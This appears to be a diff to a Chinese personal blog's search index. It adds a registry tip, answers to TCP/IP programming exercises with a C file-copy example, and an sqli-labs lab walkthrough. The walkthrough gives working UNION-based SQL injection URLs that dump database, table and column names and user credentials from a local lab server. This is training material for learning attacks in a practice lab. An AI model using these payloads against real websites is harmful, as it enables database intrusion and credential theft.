@@ -308,7 +308,9 @@ int main (void) {
   <entry>
     <title>注册表常见表项</title>
     <url>/2020/04/20/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%B8%B8%E8%A7%81%E8%A1%A8%E9%A1%B9/</url>
-    <content><![CDATA[<h2 id="锁定IE默认页，无法修改"><a href="#锁定IE默认页，无法修改" class="headerlink" title="锁定IE默认页，无法修改"></a>锁定IE默认页，无法修改</h2><p>手动创建或采用vbs脚本都可以，值为1生效</p>
+    <content><![CDATA[<h2 id="关闭开机自启动"><a href="#关闭开机自启动" class="headerlink" title="关闭开机自启动"></a>关闭开机自启动</h2><p>删除对应键值即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>
+<h2 id="锁定IE默认页，无法修改"><a href="#锁定IE默认页，无法修改" class="headerlink" title="锁定IE默认页，无法修改"></a>锁定IE默认页，无法修改</h2><p>手动创建或采用vbs脚本都可以，值为1生效</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">On Error Resume Next &#39;启动或关闭一个错误处理常式</span><br><span class="line">dim r &#39;定义变量</span><br><span class="line">Set r&#x3D;CreateObject(&quot;Wscript.Shell&quot;) &#39;创建并返回一个对 ActiveX 对象的引用</span><br><span class="line">r.Regwrite &quot;HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage&quot;,0,&quot;REG_DWORD&quot;</span><br><span class="line">&#39;设置指定的注册表键或值；此为隐藏关闭按钮</span><br></pre></td></tr></table></figure>
 <h2 id="Win菜单栏无关机选项"><a href="#Win菜单栏无关机选项" class="headerlink" title="Win菜单栏无关机选项"></a>Win菜单栏无关机选项</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;REG_DWORD</span><br><span class="line">HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose</span><br></pre></td></tr></table></figure>
 
@@ -329,7 +331,7 @@ int main (void) {
       </tags>
   </entry>
   <entry>
-    <title>shell脚本基础</title>
+    <title>shell经典案例</title>
     <url>/2020/04/21/shell%E6%A1%88%E4%BE%8B/</url>
     <content><![CDATA[]]></content>
       <categories>
@@ -337,6 +339,189 @@ int main (void) {
       </categories>
       <tags>
         <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TCPIP网络编程习题</title>
+    <url>/2020/04/26/TCPIP%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E4%B9%A0%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="第一章习题"><a href="#第一章习题" class="headerlink" title="第一章习题"></a>第一章习题</h2><ol>
+<li>套接字在网络编程中的作用是什么？为何称它为套接字？<blockquote>
+<p>作用：套接字是网络数据传输用的软件设备，用于计算机之间的网络数据传输。<br>socket本身具有“连接”的含义，如果将其引申，则可以表示两台计算机之间的网络连接。</p>
+</blockquote>
+</li>
+<li>在服务器端创建套接字后，会依次调用listen函数和accept函数。请比较并说明二者的作用。<blockquote>
+<p>int listen(int sockfd, int backlog)：调用listen函数转为可接收请求状态。<br>int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)：调用accept函数受理连接的请求。<br>一个用于监听，一个用于处理。</p>
+</blockquote>
+</li>
+<li>Linux中，对套接字数据进行I/O时可以直接使用文件I/O相关函数；而在Windows中则不可以。原因为何？<blockquote>
+<p>在Linux中，socket也被认为是文件一种，所以在网络数据的传输过程中自然可以使用文件I/O的相关函数；而Windows中，是要区分socket和文件的，所以在Windows中需要调用特殊的数据传输相关函数。</p>
+</blockquote>
+</li>
+<li>创建套接字后一般会给它分配地址，为什么？为了完成地址分配需要调用哪个函数？<blockquote>
+<p>因为如果没有IP地址和端口号，则其他客户端都无法连接到服务器端。<br>服务器端使用bind函数绑定地址和端口号</p>
+</blockquote>
+</li>
+<li>Linux中的文件描述符与Windows的句柄实际上非常相似。请以套接字为对象说明它们的含义。<blockquote>
+<p>文件描述符（句柄）是系统分配给文件或套接字的整数。文件和套接字一般经过创建过程才会被分配文件描述符。这个整数会成为操作系统与程序员之间良好的沟通的渠道。实际上，文件描述符只不过是为了方便称呼操作系统创建的文件或套接字而赋予的数而已。</p>
+</blockquote>
+</li>
+<li>底层文件的I/O函数与ANSI标准定义的文件I/O函数之间有何区别？<blockquote>
+<p>底层文件的I/O函数：与标准无关的、操作系统独立提供的I/O操作<br>ANSI标准定义的标准I/O：与操作系统无关，具有一定的可移植性<br><a href="https://blog.csdn.net/owen7500/article/details/53263981" target="_blank" rel="noopener">https://blog.csdn.net/owen7500/article/details/53263981</a><br><a href="https://blog.csdn.net/zqixiao_09/article/details/50444465" target="_blank" rel="noopener">https://blog.csdn.net/zqixiao_09/article/details/50444465</a></p>
+</blockquote>
+</li>
+<li>参考本书给出的示例low_open.c和low_read.c，分别利用底层文件I/O和ANSI标准I/O编写文件复制。可任意指定复制程序的使用方法。</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>标准I/O函数</th>
+<th>底层I/O函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>打开</td>
+<td>fopen,freopen,fdopen</td>
+<td>open</td>
+</tr>
+<tr>
+<td>关闭</td>
+<td>fclose</td>
+<td>close</td>
+</tr>
+<tr>
+<td>读</td>
+<td>getc,fgetc,getchar,fgets,gets,fread</td>
+<td>read</td>
+</tr>
+<tr>
+<td>写</td>
+<td>putc,fputc,putchar,fputs,puts,fwrite</td>
+<td>write</td>
+</tr>
+</tbody></table>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 底层I/O，文本文件复制实现</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_handling</span><span class="params">(<span class="keyword">char</span> *message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd_source, fd_des;</span><br><span class="line">    <span class="keyword">char</span> buf[BUF_SIZE];</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    </span><br><span class="line">    fd_source=<span class="built_in">open</span>(<span class="string">"data.txt"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>( fd_source==<span class="number">-1</span> )</span><br><span class="line">        error_handling(<span class="string">"open() error!"</span>);</span><br><span class="line">    fd_des=<span class="built_in">open</span>(<span class="string">"data_cpy.txt"</span>, O_CREAT|O_WRONLY|O_TRUNC);</span><br><span class="line">    <span class="keyword">if</span>( fd_des==<span class="number">-1</span> )</span><br><span class="line">        error_handling(<span class="string">"open() error!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((n = <span class="built_in">read</span>(fd_source, buf, <span class="keyword">sizeof</span>(buf))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">write</span>(fd_des, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">-1</span>)</span><br><span class="line">        error_handling(<span class="string">"read() error"</span>);</span><br><span class="line">    <span class="built_in">close</span>(fd_des);</span><br><span class="line">    <span class="built_in">close</span>(fd_source);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error_handling</span><span class="params">(<span class="keyword">char</span> *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">fputs</span>(message, <span class="built_in">stderr</span>);</span><br><span class="line">   fputc(<span class="string">'\n'</span>, <span class="built_in">stderr</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>TCP/IP网络编程</category>
+      </categories>
+      <tags>
+        <tag>c</tag>
+        <tag>网络编程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs通关记录</title>
+    <url>/2020/04/22/sqli-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="资料来源"><a href="#资料来源" class="headerlink" title="资料来源"></a>资料来源</h2><p><a href="https://www.jianshu.com/p/8a5b2f94d69d" target="_blank" rel="noopener">https://www.jianshu.com/p/8a5b2f94d69d</a><br><a href="https://www.cnblogs.com/ssslinppp/p/6178636.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssslinppp/p/6178636.html</a></p>
+<h2 id="MYSQL中的information-schema-元数据库-中常用的表"><a href="#MYSQL中的information-schema-元数据库-中常用的表" class="headerlink" title="MYSQL中的information_schema(元数据库)中常用的表"></a>MYSQL中的information_schema(元数据库)中常用的表</h2><h3 id="schemata"><a href="#schemata" class="headerlink" title="schemata"></a>schemata</h3><table>
+<thead>
+<tr>
+<th>字段</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>schema</td>
+<td>数据库名</td>
+</tr>
+</tbody></table>
+<h3 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h3><table>
+<thead>
+<tr>
+<th>字段</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema</td>
+<td>数据库名</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>数据表名</td>
+</tr>
+</tbody></table>
+<h3 id="columns"><a href="#columns" class="headerlink" title="columns"></a>columns</h3><table>
+<thead>
+<tr>
+<th>字段</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>table_schema</td>
+<td>数据库名</td>
+</tr>
+<tr>
+<td>table_name</td>
+<td>数据表名</td>
+</tr>
+<tr>
+<td>columns_name</td>
+<td>字段名</td>
+</tr>
+</tbody></table>
+<h2 id="mysql中的常用函数"><a href="#mysql中的常用函数" class="headerlink" title="mysql中的常用函数"></a>mysql中的常用函数</h2><h3 id="与数据库信息相关"><a href="#与数据库信息相关" class="headerlink" title="与数据库信息相关"></a>与数据库信息相关</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>MySQL版本</td>
+</tr>
+<tr>
+<td>user()</td>
+<td>数据库用户名</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>数据库名</td>
+</tr>
+<tr>
+<td>@@datadir</td>
+<td>数据库路径</td>
+</tr>
+<tr>
+<td>@@version_compile_os</td>
+<td>操作系统版本</td>
+</tr>
+</tbody></table>
+<h3 id="字符串并接函数"><a href="#字符串并接函数" class="headerlink" title="字符串并接函数"></a>字符串并接函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>concat(str1,str2,…)</td>
+<td>没有分隔符地连接字符串</td>
+</tr>
+<tr>
+<td>concat_ws(separator,str1,str2,…)</td>
+<td>没有分隔符地连接字符串</td>
+</tr>
+<tr>
+<td>group_concat(str1,str2,…)</td>
+<td>连接一个组的所有字符串，并以逗号分隔每一条数据</td>
+</tr>
+</tbody></table>
+<h3 id="order-by子句用来判断字段数"><a href="#order-by子句用来判断字段数" class="headerlink" title="order by子句用来判断字段数"></a>order by子句用来判断字段数</h3><p>例如SQL语句：select * from 表名 where id=1 order by n<br>n–&gt;1…n<br>如果这个表中有3个字段的话，n最多为3，如果超过3，mysql就会报错（如果没有关闭报错功能的话），这样的话我们就可以判断有几个字段啦</p>
+<h3 id="union-select"><a href="#union-select" class="headerlink" title="union select"></a>union select</h3><p><strong><em>资料来源</em></strong><br><a href="https://blog.csdn.net/weixin_44840696/article/details/89166154" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44840696/article/details/89166154</a><br>这个博客写得特别清晰<br>我们通过已知字段数时，需要找我一个回显数据的地方，union select就可以用来做这个，一会可以通过sqli-labs的练习来了解清楚。<br><em>特别</em>：我们需要让union select前面的sql语句出错，才能在能够在回显的位置显示</p>
+<h1 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h1><p>数字型：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。<br>字符型：当输入的参数为字符串时，称为字符型。</p>
+<h1 id="SQLi-LABS-Page-1-Basic-Challenges"><a href="#SQLi-LABS-Page-1-Basic-Challenges" class="headerlink" title="SQLi-LABS Page-1(Basic Challenges)"></a>SQLi-LABS Page-1(Basic Challenges)</h1><h2 id="Less-1（GET）"><a href="#Less-1（GET）" class="headerlink" title="Less-1（GET）"></a>Less-1（GET）</h2><p>1.根据提示，输入：<a href="http://192.168.20.145:86/Less-1/?id=1" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=1</a><br>2.尝试是否有注入点，使用单引号尝试。<a href="http://192.168.20.145:86/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=1&#39;</a> ，爆出错误’’1’’ LIMIT 0,1’ 最外层的单引号为错误提示的，真的错误：’1’’ LIMIT 0,1<br>3.构造sql语句。我们输入的内容为1’，剩余部分为原来sql语句所具有的，所以我们可以大致推测出sql语句：select * from 数据表名 where id=’’ LIMIT 0,1<br>4.需要闭合单引号。所以我们可以这样构造输入 1’ --+。接着尝试一下：<a href="http://192.168.20.145:86/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=1&#39;</a> --+ ，发现没有问题，那么我们可以接下去了解更多的信息。<br>5.使用order by来判断字段数。<a href="http://192.168.20.145:86/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=1&#39;</a> order by 3--+ ，当把3换成大于3的数值时，会报错，所以我们判断出有3个字段<br>6.使用union select 来寻找回显位置，构造  <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,2,3--+ 。其中1、2、3这几个数字可以是任意的。之后发现2，3在name和password那显示出来，我们找到回显位置<br>7.获取数据库名 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,database(),3--+<br>8.获取所有数据库名 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,group_concat(schema_name),3 from information_schema.schemata --+<br>9.获取当前数据下的所有表名 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+<br>10.获取当前数据库，当前数据表中的所有字段名 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()--+<br>11.获取字段值 <a href="http://192.168.20.145:86/Less-1/?id=0&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-1/?id=0&#39;</a> union select 1,group_concat(username,password),3 from users--+</p>
+<h2 id="Less-2-GET"><a href="#Less-2-GET" class="headerlink" title="Less-2(GET)"></a>Less-2(GET)</h2><p>less-2与less-1相似，前几个步骤相同<br><a href="http://192.168.20.145:86/Less-2/?id=0" target="_blank" rel="noopener">http://192.168.20.145:86/Less-2/?id=0</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; ),(select%20group_concat(username,password)%20from%20users) --+</p>
+<h2 id="Less-3-GET"><a href="#Less-3-GET" class="headerlink" title="Less-3(GET)"></a>Less-3(GET)</h2><p>同样在数字后加各种符号去测试，可以构造出sql语句：select * from users where id=(‘id’) limit 0,1<br>所以我们使用：<a href="http://192.168.20.145:86/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-3/?id=1&#39;</a>) --+  来测试<br>其他上述操作皆可</p>
+<h2 id="Less-4-GET"><a href="#Less-4-GET" class="headerlink" title="Less-4(GET)"></a>Less-4(GET)</h2><p>同样在数字后面各种符号去测试，例如&quot; 和 \。<br>select * from users where id=(&quot;id&quot;) limit 0,1<br><a href="http://192.168.20.145:86/Less-4/?id=0&quot;" target="_blank" rel="noopener">http://192.168.20.145:86/Less-4/?id=0&quot;</a>)  union select 1,2,3 --+</p>
+<h2 id="Less-5-GET"><a href="#Less-5-GET" class="headerlink" title="Less-5(GET)"></a>Less-5(GET)</h2>]]></content>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sqli-labs</tag>
       </tags>
   </entry>
 </search>
